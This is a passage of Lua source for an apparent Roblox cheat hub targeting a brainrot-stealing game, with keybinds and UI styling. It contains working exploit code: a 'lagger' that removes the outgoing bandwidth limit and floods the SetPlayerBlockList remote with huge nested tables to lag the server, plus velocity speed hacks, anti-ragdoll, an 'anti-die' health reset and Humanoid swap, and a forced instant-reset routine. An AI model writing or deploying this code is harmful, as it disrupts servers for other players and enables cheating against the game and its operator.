__HH.BTN_OFF = Color3.fromRGB(8, 20, 42)
__HH.BTN_ON = Color3.fromRGB(32, 118, 232)
__HH.TEXT_OFF = Color3.fromRGB(220, 236, 255)
__HH.TEXT_ON = Color3.fromRGB(255, 255, 255)

__HH.iceSectionEffects = setmetatable({}, {__mode = "k"})
__HH.setIceSectionActive = function(button, isActive)
    if not button then return end
    local effect = __HH.iceSectionEffects[button]

    if not effect then
        local underline = Instance.new("Frame", button)
        underline.Name = "PureBlueUnderline"
        underline.AnchorPoint = Vector2.new(0.5, 1)
        underline.Size = UDim2.new(0.84, 0, 0, 2)
        underline.Position = UDim2.new(0.5, 0, 1, 6)
        underline.BackgroundColor3 = Color3.fromRGB(120, 205, 255)
        underline.BorderSizePixel = 0
        underline.ZIndex = 15

        local ulGrad = Instance.new("UIGradient", underline)
        ulGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(25, 105, 220)),
            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(225, 248, 255)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(25, 105, 220))
        })
        ulGrad.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0.00, 0.85),
            NumberSequenceKeypoint.new(0.25, 0.10),
            NumberSequenceKeypoint.new(0.50, 0.00),
            NumberSequenceKeypoint.new(0.75, 0.10),
            NumberSequenceKeypoint.new(1.00, 0.85)
        })

        local glow = Instance.new("Frame", button)
        glow.Name = "PureBlueUnderlineGlow"
        glow.AnchorPoint = Vector2.new(0.5, 1)
        glow.Size = UDim2.new(0.96, 0, 0, 8)
        glow.Position = UDim2.new(0.5, 0, 1, 9)
        glow.BackgroundColor3 = Color3.fromRGB(48, 148, 255)
        glow.BorderSizePixel = 0
        glow.ZIndex = 14
        Instance.new("UICorner", glow).CornerRadius = UDim.new(1, 0)

        effect = {underline = underline, glow = glow}
        __HH.iceSectionEffects[button] = effect
    end

    if isActive then
        effect.underline.Visible = true
        effect.glow.Visible = true
        effect.glow.BackgroundTransparency = 0.62
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
    else
        effect.underline.Visible = false
        effect.glow.Visible = false
        button.TextColor3 = Color3.fromRGB(196, 212, 232)
    end
end

__HH.KB = {
    DropBrainrot  = {kb = Enum.KeyCode.X,           gp = nil},
    
    TPLock        = {kb = Enum.KeyCode.E,           gp = nil},
    TPFloor       = {kb = Enum.KeyCode.F,           gp = nil},
    GuiHide       = {kb = Enum.KeyCode.LeftControl, gp = nil},
    SpeedToggle   = {kb = Enum.KeyCode.Q,           gp = nil},
    -- Frame Reset uses its original R key. Lagger moves to the old reset key
    -- so the two actions never fire from the same keyboard input.
    LaggerToggle  = {kb = Enum.KeyCode.G,           gp = nil},
    InstaReset    = {kb = Enum.KeyCode.R,           gp = nil},
    AutoLeft      = {kb = Enum.KeyCode.Z,           gp = nil},
    AutoRight     = {kb = Enum.KeyCode.C,           gp = nil},
    BatV2Toggle   = {kb = Enum.KeyCode.V,           gp = nil}
}

__HH.isGamepadInput = function(inp)
    if not inp then return false end
    if inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") then return true end
    return false
end

__HH.isBindableInput = function(inp)
    if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end
    if inp.UserInputType == Enum.UserInputType.Keyboard then return true end
    return __HH.isGamepadInput(inp)
end

end
do
local CONTROLLER_BUTTONS = {
    [Enum.KeyCode.ButtonA]      = "A",       [Enum.KeyCode.ButtonB]      = "B",
    [Enum.KeyCode.ButtonX]      = "X",       [Enum.KeyCode.ButtonY]      = "Y",
    [Enum.KeyCode.ButtonL1]     = "LB",      [Enum.KeyCode.ButtonR1]     = "RB",
    [Enum.KeyCode.ButtonL2]     = "LT",      [Enum.KeyCode.ButtonR2]     = "RT",
    [Enum.KeyCode.ButtonL3]     = "LS",      [Enum.KeyCode.ButtonR3]     = "RS",
    [Enum.KeyCode.ButtonStart]  = "START",   [Enum.KeyCode.ButtonSelect] = "SELECT",
    [Enum.KeyCode.DPadUp]       = "DPAD_UP", [Enum.KeyCode.DPadLeft]     = "DPAD_LEFT",
    [Enum.KeyCode.DPadRight]    = "DPAD_RIGHT"
}

__HH.getKeyDisplayName = function(key, isGp)
    if isGp and CONTROLLER_BUTTONS[key] then return CONTROLLER_BUTTONS[key] end
    return key and key.Name or "None"
end

__HH.kbMatch = function(entry, kc)
    return kc and (kc == entry.kb or (entry.gp and kc == entry.gp))
end

local laggerState = {enabled = false, thread = nil, waitTime = 0.25, intensity = 270}
local isTouchEnabled = __HH.UIS.TouchEnabled
if isTouchEnabled then laggerState.waitTime = 5.8 end
local _laggerActive = false

local function createNestedTable(amount)
    local nested = {{}}; local current = nested[1]
    for i = 1, amount do local t = {}; table.insert(current, t); current = t end
    return nested
end

local function sendLagSpam()
    local nested = createNestedTable(laggerState.intensity)
    local payload = {}
    local maxCopies = math.min(499999 / (laggerState.intensity + 2), 1500)
    for i = 1, maxCopies do table.insert(payload, nested) end
    pcall(function()
        local r = game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
        if r then r:FireServer(payload) end
    end)
end

local function removeNetworkLimit()
    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
end

local function startLaggerEngine()
    if laggerState.thread then task.cancel(laggerState.thread); laggerState.thread = nil end
    laggerState.enabled = true
    laggerState.thread = task.spawn(function()
        while laggerState.enabled do removeNetworkLimit(); sendLagSpam(); task.wait(laggerState.waitTime) end
    end)
end

local function stopLaggerEngine()
    laggerState.enabled = false
    if laggerState.thread then task.cancel(laggerState.thread); laggerState.thread = nil end
end

local AP_L1, AP_L2 = Vector3.new(-476.48,-6.28,92.73), Vector3.new(-483.12,-4.95,94.80)
local AP_R1, AP_R2 = Vector3.new(-476.16,-6.52,25.62), Vector3.new(-483.06,-5.03,25.48)

-- ============================================
-- ============================================
-- SPEED SYSTEM (LinearVelocity-based)
-- ============================================
NS = 60
CS = 30
LAGGER_SPEED = 13
LAGGER_CARRY_SPEED = 13

carrySpeedActive = false
laggerModeEnabled = false
laggerCarryToggled = false
laggerPhase = 0
speedMode = false
autoCarrySpeedEnabled = false
setAutoCarrySpeedVisual = nil

local lastMoveDir = Vector3.new(0, 0, 0)
local MOVE_KEYS = {
    [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
    [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true
}

local AutoCarry = {
    _autoCarryFromSteal = false,
    _autoCarryGraceUntil = 0,
    _waitingForCarryPickup = false,
    _carryPickupWatchUntil = 0,
    _autoCarryReturnMode = nil,
}

local _spdLV = nil
local _spdAtt = nil
local _vertAtt = nil
local _vertLV = nil
local _stealAttrWasActive = false

local function isCarryName(name)
    local n = tostring(name or ""):lower()
    return n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold")
end

local function isIgnoredCarryTool(name)
    local n = tostring(name or ""):lower()
    return n:find("bat") or n:find("slap") or n:find("medusa") or n:find("head") or n:find("stone")
end

__HH.isCarryingBrainrot = function(char)
    if not char then return false end
    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
            if child:FindFirstChildOfClass("Humanoid") and child:FindFirstChild("HumanoidRootPart") then return true end
            if isCarryName(child.Name) then return true end
        elseif child:IsA("Tool") and not isIgnoredCarryTool(child.Name) then
            return true
        end
    end
    return false
end

function destroySpeedLV()
    if _spdLV and _spdLV.Parent then _spdLV:Destroy() end
    if _spdAtt and _spdAtt.Parent then _spdAtt:Destroy() end
    _spdLV, _spdAtt = nil, nil
end

local function setupSpeedLV(hrp)
    destroySpeedLV()
    _spdAtt = Instance.new("Attachment", hrp)
    _spdAtt.Name = "NovaHubSpeedAtt"
    _spdLV = Instance.new("LinearVelocity", hrp)
    _spdLV.Name = "NovaHubSpeedLV"
    _spdLV.Attachment0 = _spdAtt
    _spdLV.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
    _spdLV.PrimaryTangentAxis = Vector3.new(1, 0, 0)
    _spdLV.SecondaryTangentAxis = Vector3.new(0, 0, 1)
    _spdLV.MaxForce = math.huge
    _spdLV.RelativeTo = Enum.ActuatorRelativeTo.World
end

function destroyVertLV()
    if _vertLV and _vertLV.Parent then _vertLV:Destroy() end
    if _vertAtt and _vertAtt.Parent then _vertAtt:Destroy() end
    _vertLV, _vertAtt = nil, nil
end

local function getVertLV(root)
    if not _vertLV or _vertLV.Parent ~= root then
        destroyVertLV()
        _vertAtt = Instance.new("Attachment", root)
        _vertLV = Instance.new("LinearVelocity", root)
        _vertLV.Attachment0 = _vertAtt
        _vertLV.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
        _vertLV.MaxForce = math.huge
        _vertLV.RelativeTo = Enum.ActuatorRelativeTo.World
    end
    return _vertLV
end

local function driveHorizontal(root, dir, spd)
    if not dir or dir.Magnitude <= 0.1 then
        return
    end
    root.Velocity = Vector3.new(dir.X * spd, root.Velocity.Y, dir.Z * spd)
end

function drive3D(root, vel)
    local lv = getVertLV(root)
    lv.VectorVelocity = vel
end

local _nearBrainrotAt, _nearBrainrotValue = 0, false
local function isNearBrainrot(char)
    -- The actual stealable Brainrots have a ProximityPrompt, so detect the prompt itself
    -- instead of relying only on the model's display name.
    if tick() - _nearBrainrotAt < 0.15 then return _nearBrainrotValue end
    _nearBrainrotAt = tick(); _nearBrainrotValue = false
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            local holder = obj.Parent
            local part = holder and (holder:IsA("BasePart") and holder or holder:FindFirstAncestorWhichIsA("BasePart"))
            if part and (part.Position - root.Position).Magnitude <= 11 then
                _nearBrainrotValue = true
                return true
            end
        end
    end
    return false
end

local function isRagdollState(hum)
    if not hum then return true end
    local st = hum:GetState()
    return hum.PlatformStand or st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
end

function getActiveMoveSpeed()
    if laggerCarryToggled then return LAGGER_CARRY_SPEED
    elseif laggerModeEnabled then return LAGGER_SPEED
    elseif carrySpeedActive then return CS
    else return NS end
end

-- Auto Carry Speed Logic
local function setCarrySpeedMode(on)
    carrySpeedActive = on == true
    speedMode = on == true
end

local function enableCarrySpeedForSteal()
    AutoCarry._waitingForCarryPickup = false
    AutoCarry._carryPickupWatchUntil = 0
    if not AutoCarry._autoCarryFromSteal then
        -- Keep the selected speed family, so Lagger switches to Lagger Carry.
        AutoCarry._autoCarryReturnMode = laggerCarryToggled and "Lagger Carry"
            or (laggerModeEnabled and "Lagger")
            or (carrySpeedActive and "Carry")
            or "Normal"
    end
    AutoCarry._autoCarryFromSteal = true
    AutoCarry._autoCarryGraceUntil = tick() + 0.75

    if AutoCarry._autoCarryReturnMode == "Lagger" or AutoCarry._autoCarryReturnMode == "Lagger Carry" then
        laggerModeEnabled = false
        carrySpeedActive = false
        laggerCarryToggled = true
        laggerPhase = 2
        speedMode = false
    else
        setCarrySpeedMode(true)
    end
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
end

local function disableAutoCarrySpeed()
    if not AutoCarry._autoCarryFromSteal and not AutoCarry._waitingForCarryPickup then return end
    local wasAutoApplied = AutoCarry._autoCarryFromSteal
    local returnMode = AutoCarry._autoCarryReturnMode
    AutoCarry._autoCarryFromSteal = false
    AutoCarry._waitingForCarryPickup = false
    if not wasAutoApplied then return end
    if returnMode == "Lagger Carry" then
        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = false, true, false, false
        laggerPhase = 2
    elseif returnMode == "Lagger" then
        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = true, false, false, false
        laggerPhase = 1
    elseif returnMode == "Carry" then
        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = false, false, true, true
        laggerPhase = 0
    else
        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = false, false, false, false
        laggerPhase = 0
    end
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
end

-- Main Speed Loop (direct velocity)
RunService.RenderStepped:Connect(function()
    -- Auto carry speed detection
    if autoCarrySpeedEnabled then
        local aChar = LP.Character
        local aHum = aChar and aChar:FindFirstChildOfClass("Humanoid")
        if aChar and aHum then
            local gotHit = isRagdollState(aHum)
            local stealingAttr = LP:GetAttribute("Stealing") == true
            local nearBrainrot = isNearBrainrot(aChar)
            local carryingBrainrot = __HH.isCarryingBrainrot(aChar) or nearBrainrot
            -- Auto Switch Speed immediately enables Carry Speed as soon as a steal prompt is nearby.
            if nearBrainrot and not AutoCarry._autoCarryFromSteal then enableCarrySpeedForSteal() end
            if stealingAttr and not _stealAttrWasActive then
                _stealAttrWasActive = true
                enableCarrySpeedForSteal()
            elseif not stealingAttr then
                _stealAttrWasActive = false
            end
            if AutoCarry._waitingForCarryPickup then
                if gotHit or tick() > (AutoCarry._carryPickupWatchUntil or 0) then
                    AutoCarry._waitingForCarryPickup = false
                elseif carryingBrainrot then
                    enableCarrySpeedForSteal()
                end
            end
            if carryingBrainrot and not AutoCarry._autoCarryFromSteal then enableCarrySpeedForSteal() end
            if AutoCarry._autoCarryFromSteal then
                if gotHit or (tick() > AutoCarry._autoCarryGraceUntil and not carryingBrainrot and not stealingAttr) then
                    disableAutoCarrySpeed()
                end
            end
        end
    end

    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end

    if isRagdollState(hum) then
        _G.PureRagdollKilledCarry = true
        lastMoveDir = Vector3.new(0, 0, 0)
        return
    end

    -- don't interfere with tpLock / batV2 / aimbot
    if __HH.tpLockEnabled or autoLeftEnabled or autoRightEnabled or __HH.batV2Enabled or autoBatEnabled or __HH.dropActive then
        return
    end

    local md = hum.MoveDirection
    local spd = getActiveMoveSpeed()
    local moving = false

    if md.Magnitude > 0 then
        lastMoveDir = md
        moving = true
        driveHorizontal(hrp, md, spd)
    elseif __HH.antiRagdollEnabled and lastMoveDir.Magnitude > 0 then
        local anyHeld = false
        for key in pairs(MOVE_KEYS) do
            if __HH.UIS:IsKeyDown(key) then anyHeld = true; break end
        end
        if anyHeld then
            moving = true
            driveHorizontal(hrp, lastMoveDir, spd)
        end
    end

    -- when not moving, don't set velocity (matches YOUSEF67 approach)
end)

function toggleCarryMode()
    if laggerModeEnabled or laggerCarryToggled then
        laggerModeEnabled = false; laggerCarryToggled = false; laggerPhase = 0
        carrySpeedActive = true; speedMode = true
    else
        carrySpeedActive = not carrySpeedActive
        speedMode = carrySpeedActive
    end
    refreshSpeedModeLabel()
end

function toggleLaggerMode()
    if laggerCarryToggled then laggerCarryToggled = false end
    carrySpeedActive = false; speedMode = false
    laggerModeEnabled = not laggerModeEnabled
    laggerPhase = laggerModeEnabled and 1 or 0
    refreshSpeedModeLabel()
end

function toggleLaggerCarryMode()
    if laggerModeEnabled then laggerModeEnabled = false; laggerPhase = 0 end
    carrySpeedActive = false; speedMode = false
    laggerCarryToggled = not laggerCarryToggled
    if laggerCarryToggled then laggerPhase = 2 else laggerPhase = 0 end
    refreshSpeedModeLabel()
end

refreshSpeedModeLabel = function()
    if modeValLbl then
        if laggerCarryToggled then modeValLbl.Text="Lagger Carry"
        elseif laggerModeEnabled then modeValLbl.Text="Lagger"
        elseif carrySpeedActive then modeValLbl.Text="Carry"
        else modeValLbl.Text="Normal" end
    end
    if laggerModePillRef and laggerModePillRef.pill and laggerModePillRef.dot then
        local pill=laggerModePillRef.pill;local dot=laggerModePillRef.dot;local on=laggerModeEnabled
        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and Color3.fromRGB(201, 238, 255) or Color3.fromRGB(0,0,0),BackgroundTransparency=on and 0.4 or 0.85}):Play()
        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(201, 238, 255) or Color3.fromRGB(150,150,150)}):Play()
    end
    if carryModePillRef and carryModePillRef.pill and carryModePillRef.dot then
        local pill=carryModePillRef.pill;local dot=carryModePillRef.dot;local on=carrySpeedActive
        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and Color3.fromRGB(201, 238, 255) or Color3.fromRGB(0,0,0),BackgroundTransparency=on and 0.4 or 0.85}):Play()
        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(201, 238, 255) or Color3.fromRGB(150,150,150)}):Play()
    end
    if __HH.mobBtnRefs and __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
    if __HH.mobBtnRefs and __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
    if __HH.mobBtnRefs and __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
end

-- ============ FR HUB ROUND 3 SPEED BOOST (add-on) ============
-- This is ONLY an addition on top of the Pure speed system.
-- Engine: direct Velocity like FR Hub. Normalized MoveDirection so the
-- full speed is reached even with a partial mobile joystick.
do
    local R3Boost = {
        enabled = false,
        carrySpeed = 32,
        normalSpeed = 62,
        forceCarry = false,
    }
    pcall(function()
        if not (isfile and readfile and isfile("Round3SpeedBooster6_Config.json")) then return end
        local raw = readfile("Round3SpeedBooster6_Config.json")
        local cfg = game:GetService("HttpService"):JSONDecode(raw)
        if type(cfg) == "table" then
            if type(cfg.carrySpeed) == "number" and cfg.carrySpeed > 0 then R3Boost.carrySpeed = cfg.carrySpeed end
            if type(cfg.normalSpeed) == "number" and cfg.normalSpeed > 0 then R3Boost.normalSpeed = cfg.normalSpeed end
        end
    end)

    local Bridge = {
        Enabled = R3Boost.enabled,
        NormalSpeed = R3Boost.normalSpeed,
        CarrySpeed = R3Boost.carrySpeed,
        CarryMode = false,
        ForceCarry = false,
        Force = true,
    }
    _G.Round3SpeedBooster = Bridge

    local function syncBridge()
        Bridge.Enabled = R3Boost.enabled
        Bridge.NormalSpeed = R3Boost.normalSpeed
        Bridge.CarrySpeed = R3Boost.carrySpeed
        Bridge.CarryMode = R3Boost.forceCarry
        Bridge.ForceCarry = R3Boost.forceCarry
    end
    local function saveR3()
        pcall(function()
            if writefile then
                writefile("Round3SpeedBooster6_Config.json", game:GetService("HttpService"):JSONEncode({
                    carrySpeed = R3Boost.carrySpeed,
                    normalSpeed = R3Boost.normalSpeed,
                }))
            end
        end)
    end
    Bridge.setNormalSpeed = function(value)
        value = tonumber(value)
        if not value or value <= 0 then return end
        R3Boost.normalSpeed = value
        syncBridge(); saveR3()
    end
    Bridge.setCarrySpeed = function(value)
        value = tonumber(value)
        if not value or value <= 0 then return end
        R3Boost.carrySpeed = value
        syncBridge(); saveR3()
    end
    Bridge.setForceCarry = function(on)
        R3Boost.forceCarry = on == true
        syncBridge()
    end
    Bridge.setEnabled = function(on)
        R3Boost.enabled = on == true
        if not R3Boost.enabled then R3Boost.forceCarry = false end
        syncBridge()
    end
    local function getR3BoostSpeed()
        if not R3Boost.enabled then return R3Boost.normalSpeed end
        return R3Boost.forceCarry and R3Boost.carrySpeed or R3Boost.normalSpeed
    end
    syncBridge()

    RunService.RenderStepped:Connect(function()
        if not R3Boost.enabled then return end
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then return end
        -- let the other movement features own the player while they run
        if __HH.tpLockEnabled or autoLeftEnabled or autoRightEnabled or __HH.batV2Enabled or autoBatEnabled or __HH.dropActive then return end
        local md = hum.MoveDirection
        local spd = getR3BoostSpeed()
        if md.Magnitude > 0.01 then
            -- normalize: mobile joystick gives partial magnitude, which is
            -- why 62 used to feel like ~34. Unit vector = full speed.
            md = md.Unit
            hrp.Velocity = Vector3.new(md.X * spd, hrp.Velocity.Y, md.Z * spd)
        else
            hrp.Velocity = Vector3.zero
        end
        if R3Boost.forceCarry ~= carrySpeedActive then
            carrySpeedActive = R3Boost.forceCarry
            speedMode = carrySpeedActive
            if refreshSpeedModeLabel then refreshSpeedModeLabel() end
        end
    end)
end

-- R3-aware overrides: when the FR boost is enabled, the Pure velocity loop
-- and the CARRY SPD button drive the FR speeds instead of the Pure ones.
-- Wrapped in do..end so the chunk-level local limit (200) is untouched.
do
    local pureGet = getActiveMoveSpeed
    local pureToggleCarry = toggleCarryMode
    function getActiveMoveSpeed()
        local b = _G.Round3SpeedBooster
        if b and b.Enabled == true then
            return (b.ForceCarry == true) and b.CarrySpeed or b.NormalSpeed
        end
        return pureGet()
    end
    function toggleCarryMode()
        local b = _G.Round3SpeedBooster
        if b and b.Enabled == true then
            if b.setForceCarry then b.setForceCarry(not (b.ForceCarry == true)) end
            carrySpeedActive = (b.ForceCarry == true)
            speedMode = carrySpeedActive
            refreshSpeedModeLabel()
            return
        end
        pureToggleCarry()
    end
end

-- ============================================

-- ============================================================
-- ANTI RAGDOLL (VisDuels version)
-- ============================================================
do
    local visAntiConn = nil
    local visResetCooldown = 0

    local function visForceReset()
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not hum or not root or hum.Health <= 0 then return end
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            root.Velocity = Vector3.zero
            root.RotVelocity = Vector3.zero
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("Motor6D") then obj.Enabled = true end
                if obj:IsA("Constraint") then obj.Enabled = true end
            end
            if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = hum end
            local ps = LP:FindFirstChild("PlayerScripts")
            local pm = ps and ps:FindFirstChild("PlayerModule")
            local cm = pm and pm:FindFirstChild("ControlModule")
            if cm then local controls = require(cm); if controls then controls:Enable() end end
            hum.AutoRotate = true
            hum.PlatformStand = false
            hum.Sit = false
        end)
    end

    __HH.stopAntiRagdoll = function()
        if visAntiConn then visAntiConn:Disconnect(); visAntiConn = nil end
    end

    __HH.startAntiRagdoll = function()
        __HH.stopAntiRagdoll()
        if not __HH.antiRagdollEnabled then return end
        visAntiConn = RunService.Heartbeat:Connect(function()
            if not __HH.antiRagdollEnabled then return end
            local char = LP.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hum or hum.Health <= 0 then return end
            local state = hum:GetState()
            local ragdolled = state == Enum.HumanoidStateType.Physics
                or state == Enum.HumanoidStateType.Ragdoll
                or state == Enum.HumanoidStateType.FallingDown
            if ragdolled and tick() - visResetCooldown > 0.15 then
                visResetCooldown = tick()
                visForceReset()
            end
        end)
    end

    LP.CharacterAdded:Connect(function()
        task.wait(0.5)
        if __HH.antiRagdollEnabled then __HH.startAntiRagdoll() end
    end)
end

-- Instant Reset (Nexus Hub port from Lord Hub): camera-lock + collision strip +
-- HipHeight spike until respawn, hard-kill fallback. Replaces the old void-teleport reset.
end
do
__HH.FrameReset = {}
do
    -- Nexus Hub instant reset (ported from Lord Hub):
    -- camera lock + collision strip + giant HipHeight until respawn is
    -- detected, with a hard-kill fallback if the char refuses to die.
    local camLocked          = false
    local lockedCamCFrame    = nil
    local resetCooldown      = false
    local resetThread        = nil
    local resetStop          = false
    local respawnConn        = nil
    local runtimeAlive       = true
    local deathResetEnabled  = false
    local deathResetThread   = nil
    local INSTANT_RESET_STEP = 0.05

    local function ResetPlayer()
        if resetCooldown then return end
        resetCooldown = true
        resetStop = false
        camLocked = false

        -- Clear anti-die connections so the character can actually die/respawn.
        for _, conn in pairs(__HH.antiDieConns) do pcall(function() conn:Disconnect() end) end
        __HH.antiDieConns = {}

        local character = LP.Character
        if not character then
            resetCooldown = false
            return
        end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then
            resetCooldown = false
            return
        end

        local camera = workspace.CurrentCamera
        if camera then
            lockedCamCFrame = camera.CFrame
            camLocked = true
            camera.CFrame = lockedCamCFrame
        end

        local ok = false
        local isRespawning = false

        resetThread = task.spawn(function()
            local attempts = 0
            local maxAttempts = 40
            local originalHipHeight = humanoid.HipHeight

            while character and character.Parent
                and humanoid and humanoid.Health > 0
                and not isRespawning
                and not resetStop do

                if LP.Character ~= character then
                    isRespawning = true
                    break
                end

                pcall(function()
                    humanoid.HipHeight = 1e30
                    humanoid.AutoRotate = true

                    local rootPart = character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        rootPart.CanCollide = false
                    end

                    for _, part in ipairs(character:GetChildren()) do
                        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                            part.CanCollide = false
                        end
                    end
                end)

                if not character or not character.Parent
                    or not humanoid or humanoid.Health <= 0
                    or LP.Character ~= character then
                    ok = true
                    break
                end

                attempts = attempts + 1
                if attempts >= maxAttempts then break end
                task.wait(INSTANT_RESET_STEP)
            end

            if not ok
                and not resetStop
                and character and character.Parent
                and humanoid and humanoid.Health > 0
                and not isRespawning then

                pcall(function()
                    humanoid.Health = 0
                end)

                task.wait(0.1)
                if not character.Parent or humanoid.Health <= 0 then
                    ok = true
                end
            end

            if not ok and character and character.Parent and humanoid then
                pcall(function()
                    humanoid.HipHeight = originalHipHeight

                    local rootPart = character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        rootPart.CanCollide = true
                    end

                    for _, part in ipairs(character:GetChildren()) do
                        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                            part.CanCollide = true
                        end
                    end
                end)
            end

            camLocked = false
            resetCooldown = false
            resetThread = nil
            resetStop = false
        end)

        if respawnConn then respawnConn:Disconnect() end
        respawnConn = LP.CharacterAdded:Connect(function(newChar)
            if respawnConn then respawnConn:Disconnect(); respawnConn = nil end
            camLocked = false
            resetCooldown = false
            if resetThread then pcall(task.cancel, resetThread); resetThread = nil end
            local newHum = newChar:WaitForChild("Humanoid", 3)
            pcall(function()
                if camera then
                    camera.CameraSubject = newHum
                    camera.CameraType = Enum.CameraType.Custom
                end
            end)
        end)
    end

    local function StopResetSequence()
        resetStop = true
        if resetThread then pcall(task.cancel, resetThread); resetThread = nil end
        camLocked = false
        resetCooldown = false
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local cam = workspace.CurrentCamera
        if hum and cam then
            pcall(function() cam.CameraSubject = hum; cam.CameraType = Enum.CameraType.Custom end)
        end
    end

    -- camera lock (Nexus RenderStepped style)
    RunService.RenderStepped:Connect(function()
        if camLocked and lockedCamCFrame and workspace.CurrentCamera then
            workspace.CurrentCamera.CFrame = lockedCamCFrame
        end
    end)

    local function ToggleDeathReset(enable)
        deathResetEnabled = enable == true
        if deathResetEnabled and not deathResetThread then
            deathResetThread = task.spawn(function()
                local cooldown = 0
                while runtimeAlive and deathResetEnabled do
                    task.wait(0.1)
                    local char = LP.Character
                    if not char then
                        if tick() - cooldown > 2 then
                            cooldown = tick()
                            ResetPlayer()
                        end
                    else
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum and hum.Health <= 0 and tick() - cooldown > 0 then
                            cooldown = tick()
                            ResetPlayer()
                            task.wait(0.1)
                        end
                    end
                end
                deathResetThread = nil
            end)
        elseif not deathResetEnabled and deathResetThread then
            task.cancel(deathResetThread)
            deathResetThread = nil
        end
    end

    __HH.FrameReset.ResetPlayer = ResetPlayer
    __HH.FrameReset.StopResetSequence = StopResetSequence
    __HH.FrameReset.ToggleDeathReset = ToggleDeathReset
    __HH.FrameReset.Destroy = function()
        runtimeAlive = false
        ToggleDeathReset(false)
        StopResetSequence()
    end
end

pcall(function()
    if _G.PureFrameReset and _G.PureFrameReset.Destroy then
        _G.PureFrameReset.Destroy()
    end
end)
_G.PureFrameReset = __HH.FrameReset

__HH.stopAntiDie = function()
    for _, conn in pairs(__HH.antiDieConns) do pcall(function() conn:Disconnect() end) end
    __HH.antiDieConns = {}
end

__HH.startAntiDie = function()
    __HH.stopAntiDie()
    if not __HH.antiDieEnabled then return end
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    hum.BreakJointsOnDeath = false
    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

    table.insert(__HH.antiDieConns, hum:GetPropertyChangedSignal("Health"):Connect(function()
        if hum.Health <= 0 then
            hum.Health = hum.MaxHealth
        end
    end))

    table.insert(__HH.antiDieConns, hum.Died:Connect(function()
        task.wait()
        local newHum = Instance.new("Humanoid")
        newHum.Name = "ReplacedHumanoid"
        newHum.Parent = char
        workspace.CurrentCamera.CameraSubject = newHum
        hum:Destroy()
    end))
end

-- Frame Reset automatic reset-on-death integration.
__HH.autoResetOnDeath = false
__HH.setAutoResetOnDeathVisual = nil
__HH.setupDeathReset = function()
    __HH.FrameReset.ToggleDeathReset(__HH.autoResetOnDeath)
end

RunService.Stepped:Connect(function()
